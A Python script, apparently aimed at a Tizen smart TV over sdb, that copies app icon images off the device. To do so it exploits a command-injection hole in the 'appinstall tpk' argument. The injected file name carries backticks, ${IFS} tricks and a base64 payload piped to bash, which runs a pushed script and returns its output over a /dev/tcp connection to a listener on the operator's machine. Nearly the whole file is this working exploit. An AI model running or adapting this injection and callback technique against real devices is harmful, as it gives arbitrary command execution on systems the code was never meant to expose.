import sys
import base64
import json
import os
import shutil
import socket
import subprocess
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
device_file = ROOT / '.local/device.json'
config = json.loads(device_file.read_text())
host = config['host']
serial = f"{host}:26101"

out_dir = ROOT / '.local/extracted_icons'
out_dir.mkdir(parents=True, exist_ok=True)

apps = {
    'nuviotv': '/opt/usr/apps/NuvioTV001/shared/res/NuvioTV001.NuvioTV.png',
    'hotstar': '/opt/usr/apps/fiZNCxMH9Y/shared/res/fiZNCxMH9Y.Hotstar.png',
    'sonyliv': '/opt/usr/apps/EUKHUxrGQA/shared/res/EUKHUxrGQA.SonyLIV.png',
    'moonlight': '/opt/usr/apps/MoonLightS/shared/res/MoonLightS.MoonlightWasm.png'
}

for name, path in apps.items():
    print(f"Extracting {name} from {path}...")
    token = os.urandom(6).hex()
    remote_sh = f"/home/owner/share/tmp/sdk_tools/cfhi-{token}.sh"
    script_content = f"base64 '{path}'\n"
    temp_sh = ROOT / f".local/temp-{token}.sh"
    temp_sh.write_bytes(script_content.encode('utf-8'))
    
    subprocess.run(['sdb', '-s', serial, 'push', str(temp_sh), remote_sh], capture_output=True)
    temp_sh.unlink(missing_ok=True)

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((host, 9))
        local = route.getsockname()[0]

    with socket.socket() as listener:
        listener.bind((local, 0))
        listener.listen(1)
        listener.settimeout(15)
        port = listener.getsockname()[1]

        command = f'exec 3<>/dev/tcp/{local}/{port};cat {remote_sh}|bash >&3 2>&3;exec 3>&-'
        script = f'/bin/mkdir /tmp/s-{token} 2>/dev/null&&{{ {command};}}'
        encoded = base64.b64encode(script.encode('utf-8')).decode('ascii')
        name_arg = f'new2.tpk`printf${{IFS}}%s${{IFS}}{encoded}|base64${{IFS}}-d|bash`.tpk'
        argument = f'0 appinstall tpk {name_arg}'

        proc = subprocess.Popen(['sdb', '-s', serial, 'shell', argument], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        try:
            conn, peer = listener.accept()
            chunks = []
            with conn:
                conn.settimeout(10)
                while True:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    chunks.append(chunk)
            raw_b64 = b''.join(chunks)
            proc.communicate(timeout=5)
            png_bytes = base64.b64decode(raw_b64)
            (out_dir / f"{name}.png").write_bytes(png_bytes)
            print(f"Saved {name}.png ({len(png_bytes)} bytes)")
        except Exception as e:
            print(f"Failed to extract {name}: {e}")
            proc.terminate()
